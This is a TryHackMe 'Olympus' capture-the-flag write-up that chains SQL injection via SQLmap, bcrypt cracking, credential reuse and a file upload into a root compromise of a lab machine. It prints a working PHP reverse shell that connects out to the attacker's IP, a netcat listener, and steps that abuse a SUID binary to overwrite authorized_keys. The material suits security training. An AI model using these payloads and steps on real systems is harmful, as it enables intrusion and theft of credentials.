Written By Aryan Giri

# TryHackMe: Olympus

**Room:** [Olympus](https://tryhackme.com/room/olympusroom)

**Platform:** TryHackMe

**Difficulty:** As listed on TryHackMe

**Target IP:** `10.49.129.47` (used during the later stages of my attack)

## 1. Initial Reconnaissance

We will start by scanning the target machine using Nmap to identify open ports, running services, and other useful information.

```bash
nmap -sV -sC TARGET_IP
```

<img width="1002" height="502" alt="Screenshot 2026-09-15 142233" src="https://github.com/user-attachments/assets/009e5265-eaf6-4784-bbfb-b052b35e6368" />


The scan reveals two open ports:

* `22/tcp` - SSH
* `80/tcp` - HTTP

The Nmap script scan also reveals the following:

```text
http-title: Did not follow redirect to http://olympus.thm
```

This indicates that the web server redirects requests to the hostname `olympus.thm`.

Since we do not have a DNS server resolving this hostname in our lab environment, we need to add an entry to our local hosts file.

```bash
sudo nano /etc/hosts
```

Add the following entry:

```text
TARGET_IP olympus.thm
```

Replace `TARGET_IP` with the target machine's IP address.

<img width="804" height="412" alt="Screenshot 2026-09-15 142532" src="https://github.com/user-attachments/assets/9f0cfc5d-a356-475d-94ba-a0dea9bebb66" />


## 2. Exploring the Web Application

Now let's visit the website:

`http://olympus.thm`

<img width="931" height="748" alt="Screenshot 2026-09-15 142636" src="https://github.com/user-attachments/assets/552d5cc3-ecb1-4dde-8033-0a795b083b85" />


The website indicates that it is under development.

Instead of stopping here, we will enumerate the web server to discover additional directories and files.

### Directory Enumeration

We will use Gobuster with the common directory wordlist.

```bash
gobuster dir -u http://olympus.thm -w /usr/share/dirb/wordlists/common.txt --no-error -x bak,js,php,txt,html
```

<img width="1150" height="863" alt="Screenshot 2026-09-15 150310" src="https://github.com/user-attachments/assets/3bb6a4aa-f3f3-4743-a6c1-b0d78a0ce37b" />


The scan discovers several files and directories. Some of the discovered files return HTTP 403 Forbidden.

Before attempting to bypass those restrictions, let's inspect the directories that are accessible.

One interesting discovery is:

`http://olympus.thm/webmaster/`

This directory returns HTTP 200, meaning the resource is accessible.

<img width="1361" height="801" alt="Screenshot 2026-09-15 150817" src="https://github.com/user-attachments/assets/ec8a7fbd-d299-4dc4-9c87-88ab238c693c" />


The website looks somewhat like WordPress, but further inspection reveals that it uses **Victor CMS**.

I also tried searching for information about this CMS, including known vulnerabilities and misconfigurations. However, I could not find much useful information about it. It may be a fictional or lab-specific CMS.

The page also contains a search box and a login section. These provide potential entry points for further testing.

## 3. SQL Injection in the Search Functionality

Let's start testing the search functionality.

<img width="337" height="373" alt="Screenshot 2026-09-15 150855" src="https://github.com/user-attachments/assets/1978e635-a5cd-41dc-bb24-c3d18eecf3e3" />


I tried entering a single quotation mark (`'`) into the search box.

<img width="408" height="270" alt="Screenshot 2026-09-15 150904" src="https://github.com/user-attachments/assets/97172730-1784-4707-b6e3-37b37f8a01aa" />


The application returned an error.

<img width="954" height="473" alt="Screenshot 2026-09-15 150924" src="https://github.com/user-attachments/assets/66748353-f293-4a07-8351-f285d30f0451" />


This is a potential indication of SQL injection. The error message also reveals that the application is using **MySQL**.

However, an error alone is not sufficient to establish exploitability. We need to investigate further.

### Capturing the Request with Burp Suite

We will intercept a search request using Burp Suite.

1. Enable Burp interception.
2. Enter a test search term into the application's search box.
3. Submit the request.
4. Forward or capture the request.
5. Save the request to a file named `req`.

We can now use the captured request as input for SQLmap.

### Enumerating Databases

```bash
sqlmap -r req -dbms=mysql --dbs
```
<img width="1585" height="707" alt="Screenshot 2026-09-16 125548" src="https://github.com/user-attachments/assets/f76a8f41-719d-4dd8-97ff-78baf8819140" />


SQLmap successfully extracts database information, confirming that the search functionality is vulnerable to SQL injection.

The database named `olympus` is particularly interesting.

### Enumerating Tables

Let's enumerate the tables inside the `olympus` database.

```bash
sqlmap -r req -D olympus --tables -dbms=mysql
```

<img width="1194" height="431" alt="Screenshot 2026-09-16 130656" src="https://github.com/user-attachments/assets/83730b0e-2092-47c3-95f8-1f2a3e3ca8c5" />


Among the discovered tables are:

* `flag`
* `users`
* `chat`

We will investigate these tables individually.

### Dumping the First Flag

The `flag` table looks interesting, so let's dump its contents.

```bash
sqlmap -r req -D olympus -T flag -dbms=mysql --dump
```

<img width="603" height="234" alt="image" src="https://github.com/user-attachments/assets/e9e5eed8-854e-43cf-89b9-b0c54ea66791" />



We successfully retrieve the **first flag**.

### Dumping User Information

Next, let's inspect the `users` table.

```bash
sqlmap -r req -D olympus -T users -dbms=mysql --dump
```

<img width="1913" height="262" alt="Screenshot 2026-09-16 160156" src="https://github.com/user-attachments/assets/6f7222d7-f245-4983-bf8a-2ad07138b3a0" />


The table contains three users, along with their email addresses and password hashes.

The hashes are bcrypt hashes.

Bcrypt is designed to make password cracking computationally expensive, so cracking these hashes may take some time depending on the password strength and available resources.

## 4. Cracking the Password Hashes

We will save the three hashes into a file named `hashes.txt`, with one hash per line.

```bash
nano hashes.txt
```

Paste the hashes into the file and save it.

Now use John the Ripper to attempt to crack the hashes using the RockYou wordlist.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt
```

John will display its progress while processing the hashes. After a few minutes, you may see output similar to this:

```text
g 0:00:00:04 0.26% 2/3 (ETA: 17:04:30) 0g/s 96.11p/s 200.9c/s 200.9C/s nelson..teresa
```

To check whether any passwords have been recovered, run:

```bash
john --show hashes.txt
```

<img width="600" height="130" alt="image" src="https://github.com/user-attachments/assets/f3e749a7-3e98-4c6b-994c-aa822b53a5ab" />




The recovered password corresponds to the user `prometheus`, who appears first in the dumped users table.

The password itself is omitted from this writeup.

## 5. Accessing the Administrator Panel

Now that we have recovered credentials, let's return to the web application.

Use the recovered credentials in the login section.

After logging in, we gain access to an administrator page.

<img width="1498" height="821" alt="Screenshot 2026-09-16 154312" src="https://github.com/user-attachments/assets/af74005e-2a55-4326-b231-5c1394549b67" />


The panel allows us to create and delete posts and manage parts of the website.

I explored the available functionality but did not immediately find another useful entry point.

However, we still have information from the SQL injection that we have not investigated: the users' email addresses.

One of those email addresses provides a clue about another hostname.

## 6. Discovering the Chat Application

The email information suggests that the application has another service running under the hostname:

`chat.olympus.thm`

In this lab, we need to resolve the hostname locally rather than relying on public DNS.

Add another entry to `/etc/hosts`:

```text
TARGET_IP chat.olympus.thm
```

<img width="722" height="430" alt="Screenshot 2026-09-16 160241" src="https://github.com/user-attachments/assets/f3d46777-956f-42df-ab0d-b6f7869eaa80" />


Now visit:

`http://chat.olympus.thm/`

<img width="1008" height="657" alt="Screenshot 2026-09-16 160317" src="https://github.com/user-attachments/assets/05e238cc-05fb-4ec5-909b-6364453ec940" />


We discover a login page for a chat platform.

Let's try the credentials recovered earlier through SQL injection.

After logging in, we can access the chat interface and read conversations.

<img width="1332" height="810" alt="Screenshot 2026-09-16 160438" src="https://github.com/user-attachments/assets/7f836eb6-fc56-4f71-94f5-6a2dcc22b279" />


### Investigating the Chat Logs

The chat messages reveal an interesting implementation detail.

An IT employee mentions that uploaded files are assigned random filenames.

This is important because it means that simply uploading a file and guessing its original filename will not necessarily allow us to access it.

The chat interface also contains a text file that we can investigate later.

## 7. Enumerating the Chat Application

Let's enumerate the chat application's directories using Gobuster.

```bash
gobuster dir -u http://chat.olympus.thm/ -w /usr/share/dirb/wordlists/common.txt --no-error -x bak,js,php,txt,html
```

<img width="1043" height="341" alt="Screenshot 2026-09-16 161354" src="https://github.com/user-attachments/assets/c35b4195-e3c7-4c57-8b2c-d9e24de6af04" />


One interesting discovery is:

`http://chat.olympus.thm/uploads/`

Let's visit the uploads directory.

The directory displays an image, but nothing immediately useful is visible.

### Testing File Upload Behavior

I also uploaded a PHP reverse shell to investigate whether uploaded PHP files could be executed.

The reverse shell used was:

```php
<?php
$sock = fsockopen("192.168.134.12", 4444);
$proc = proc_open("/bin/bash -i", [
    0 => $sock,
    1 => $sock,
    2 => $sock
], $pipes);
?>
```

I saved the payload as:

```text
shell.php
```

The IP address in the payload is the address of my attacking machine and should be replaced with the appropriate reachable address when reproducing the test.

After uploading the file, I attempted to access:

`http://chat.olympus.thm/uploads/shell.php`

However, the expected shell did not execute.

This is consistent with the information from the chat logs: uploaded files are renamed, so the original filename is not preserved.

We need to discover the actual filename assigned to our upload.

## 8. Recovering Uploaded Filenames Through SQL Injection

Remember the `chat` table we discovered earlier?

Let's dump it.

```bash
sqlmap -r req -D olympus -T chat --dump -dbms=mysql
```

<img width="1912" height="694" alt="Screenshot 2026-09-16 161643" src="https://github.com/user-attachments/assets/3fc05259-4184-470c-a305-8b889b39de9a" />


The dumped chat records contain useful information, including messages and uploaded filenames.

We can identify the renamed PHP file corresponding to our upload:

```text
8e830cdc9623916595bd6b3d5b203fc.php
```

The text file mentioned earlier also has a generated filename:

```text
47c3210d51761686f3af40a875eeaaea.txt
```

<img width="1102" height="233" alt="Screenshot 2026-09-16 161742" src="https://github.com/user-attachments/assets/6696b79a-e486-4b10-96c2-080b79a5ad72" />


The text file did not contain anything particularly useful during my investigation.

Now we know the actual filename assigned to the PHP upload.

## 9. Obtaining a Reverse Shell

Start a Netcat listener on the attacking machine:

```bash
nc -lvnp 4444
```

Next, trigger the uploaded PHP file using its renamed filename:

`http://chat.olympus.thm/uploads/8e830cdc9623916595bd6b3d5b203fc.php`

If the payload executes successfully and the target can reach the listener, we should receive a connection.

We now have an initial shell on the target.

### Initial Post-Exploitation Enumeration

After obtaining the shell, I performed basic post-exploitation enumeration to understand the compromised environment.

This included checking:

* The current user and group memberships.
* The current working directory.
* Accessible files and directories.
* Running processes.
* System information.
* Potential privilege-escalation paths.

During this stage, I also retrieved the **user flag** from the Zeus user's home directory.

```text
/home/zeus/user.flag
```

<img width="576" height="216" alt="image" src="https://github.com/user-attachments/assets/e3ac7858-a6e5-4ff3-b461-25443aff5008" />



With the user flag obtained, the next objective is privilege escalation.

## 10. Linux Privilege Escalation

Let's enumerate SUID binaries on the target.

SUID executables can run with the privileges of their file owner. A poorly implemented or misconfigured SUID program may therefore provide a privilege-escalation opportunity.

Run:

```bash
find / -perm -4000 -type f 2>/dev/null
```

<img width="494" height="188" alt="Screenshot 2026-09-17 151414" src="https://github.com/user-attachments/assets/ddf9597b-600a-4b9f-8509-2f51fa187fbd" />


Among the results, we discover an interesting executable:

```text
/usr/bin/cputils
```

Let's investigate its behavior.

```bash
/usr/bin/cputils
```


During my investigation, I found that `cputils` could write file contents to a destination and overwrite existing files.

This behavior becomes particularly interesting when combined with its SUID permissions.

### Investigating Zeus's Files

I also inspected:

```text
/home/zeus/zeus.txt
```

<img width="754" height="555" alt="Screenshot 2026-09-17 151430" src="https://github.com/user-attachments/assets/0ca7c5d4-0424-4019-88b3-07c7a8be7eed" />


The file contains a message indicating that the machine had previously been compromised.

This adds some context to the lab's fictional scenario.

### Investigating the SSH Key

Next, I investigated the SSH-related files belonging to Zeus.

<img width="795" height="493" alt="Screenshot 2026-09-17 153419" src="https://github.com/user-attachments/assets/cadb48c0-ca61-4db8-ad75-caea0ebfb2de" />


I attempted to crack the SSH private key using John the Ripper.

First, convert the key into a format John can process:

```bash
ssh2john id_rsa > hash.txt
```

Then run:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

<img width="672" height="535" alt="Screenshot 2026-09-17 153448" src="https://github.com/user-attachments/assets/29a058b0-e0b1-4a31-b868-f941ee58c1f6" />


Although I recovered information from the key, I could not get the original key to work for SSH authentication.

Instead of spending more time troubleshooting that key, I decided to generate a new SSH key pair and investigate whether the SUID binary could be used to modify Zeus's authorized keys.

## 11. Exploiting cputils for SSH Access

Generate a new RSA key pair on the attacking machine.

```bash
ssh-keygen -t rsa -f attack_key
```

<img width="893" height="493" alt="Screenshot 2026-09-17 154153" src="https://github.com/user-attachments/assets/3d90906d-f43d-4f65-925a-9764fb3cd865" />


This creates two files:

```text
attack_key
attack_key.pub
```

The private key is `attack_key`, while `attack_key.pub` contains the public key.

Display the public key:

```bash
cat attack_key.pub
```

We need to transfer the public key to the target.

First, set appropriate permissions on the private key:

```bash
chmod 600 attack_key
```

Start a simple HTTP server in the directory containing the public key:

```bash
python3 -m http.server 8000
```

On the target machine, download the public key into `/tmp`:

```bash
wget http://YOUR_IP:8000/attack_key.pub -O /tmp/attack_key.pub
```

Replace `YOUR_IP` with the reachable IP address of your attacking machine.

### Modifying authorized_keys

We can now use the discovered behavior of `cputils` to overwrite Zeus's SSH authorized-keys file with our public key.

The target file is:

```text
/home/zeus/.ssh/authorized_keys
```

<img width="750" height="356" alt="Screenshot 2026-09-17 155332" src="https://github.com/user-attachments/assets/e1df811f-4b37-4f6d-8051-95fcc12b8183" />


The objective is to make our public key an accepted authentication key for Zeus.

Once the modification succeeds, attempt to connect over SSH.

```bash
ssh -i attack_key zeus@TARGET_IP
```

<img width="1021" height="572" alt="Screenshot 2026-09-17 155402" src="https://github.com/user-attachments/assets/222778e1-e064-4245-8a37-1376dfb79aea" />


We successfully obtain an SSH session as `zeus`.

This gives us a more stable shell and allows us to investigate directories that were inaccessible during the initial web-shell session.

## 12. Discovering the Root Privilege-Escalation Path

During the earlier enumeration, I identified a directory that I could not access as the initial compromised account:

```text
/var/www/html/0aB44fdS3eDnLkpsz3deGv8TttR4sc
```
<img width="776" height="153" alt="Screenshot 2026-09-17 162435" src="https://github.com/user-attachments/assets/7a7eb1fd-eac0-47ee-b0c5-523eb4c07deb" />
Now that we have a Zeus SSH session, let's inspect it.

<img width="1595" height="832" alt="Screenshot 2026-09-17 163457" src="https://github.com/user-attachments/assets/94e0df34-ed35-459f-80f3-f3cdacc6e53d" />


Inside the directory, we discover a PHP file containing another reverse-shell mechanism.

The script is designed to establish a remote connection and execute a command that interacts with a specially placed SUID binary.

### Understanding the PHP Script

The script's behavior can be broken down into several stages.

**Entry**

The PHP script must first be made accessible to the web server and triggered through an HTTP request.

The script accepts connection parameters through GET arguments, including an IP address and port.

**Reverse connection**

The script uses PHP's `fsockopen` function to establish a connection to the specified listener.

It then uses `proc_open` to execute a shell command.

**Privilege escalation**

The important component is the executable:

```text
/lib/defended/libc.s0.99
```

The script invokes this binary as part of its execution chain.

The binary is intended to provide a root-level shell because of its SUID configuration and ownership.

**Impact**

If the chain executes as intended, the resulting shell can provide root-level access to the target.

This is a privilege-escalation path involving an exposed PHP script and a specially configured SUID executable.

## 13. Obtaining Root Access

In my case, I chose to execute the SUID binary directly rather than relying entirely on the PHP reverse-shell chain.

The relevant executable is:

```text
/lib/defended/libc.s0.99
```

Executing it provides the privilege-escalation opportunity.

The command sequence referenced by the PHP script is:

```bash
uname -a; w; /lib/defended/libc.s0.99
```

Alternatively, the binary can be invoked directly:

```bash
/lib/defended/libc.s0.99
```
then
```
bash
```

In my case, I performed a little additional work to obtain a more usable shell by executing the binary and then invoking Bash.

After obtaining the root shell, I changed to the root directory.

```bash
cd /root
```


We can now retrieve the **root flag**.

<img width="1395" height="861" alt="Screenshot 2026-09-17 163645" src="https://github.com/user-attachments/assets/6f5ce579-c80c-445e-a4dc-afe2e76884e8" />


## 14. Finding the Bonus Flag

The root flag file also provides a hint about a bonus flag.

The hint references SSL, but it does not immediately identify the exact file location.

Rather than guessing, I used a regular expression to search readable files for strings matching the flag format.

```bash
for d in /*/; do (find "$d" -type f -readable -print0 2>/dev/null | xargs -0 -r grep -HaoE 'flag\{[^}]+\}' 2>/dev/null) & done; wait
```

This command searches readable files under the top-level directories for strings matching the pattern:

```text
flag{...}
```

Depending on the number of files and the target's performance, the search may take some time.

Be patient while it runs.

[Add bonus flag search screenshot here]

The search reveals the bonus flag file:

```text
/etc/ssl/private/.b0nus.fl4g
```

The path also matches the SSL-related hint provided by the room.

We can now inspect the file and retrieve the **bonus flag**.

```
cat /etc/ssl/private/.b0nus.fl4g
```

## Conclusion

The Olympus room demonstrates how several individually useful findings can be combined into a complete compromise.

The attack path involved:

1. Network reconnaissance using Nmap.
2. Virtual-host discovery and local hostname resolution.
3. Web directory enumeration using Gobuster.
4. SQL injection testing and database enumeration using SQLmap.
5. Password hash cracking with John the Ripper.
6. Credential reuse to access the administrator panel and chat application.
7. Discovering randomized upload filenames through database enumeration.
8. Obtaining an initial shell through the uploaded PHP file.
9. SUID enumeration and abuse of `cputils`.
10. SSH access as Zeus through modification of authorized keys.
11. Discovering and exploiting a root-level SUID execution path.
12. Retrieving the user, root, and bonus flags.

The most important lesson from this machine is that **information gathered at one stage can become the key to the next stage**.

The SQL injection did more than expose a database. It revealed credentials, chat records, and filenames that helped connect multiple parts of the attack chain. Likewise, the SUID binary was not just an isolated finding: its file-writing behavior enabled SSH access, while another specially configured binary provided the route to root.

That is what makes chained exploitation interesting. The individual vulnerabilities matter, but understanding how they interact is what turns reconnaissance into a complete compromise.
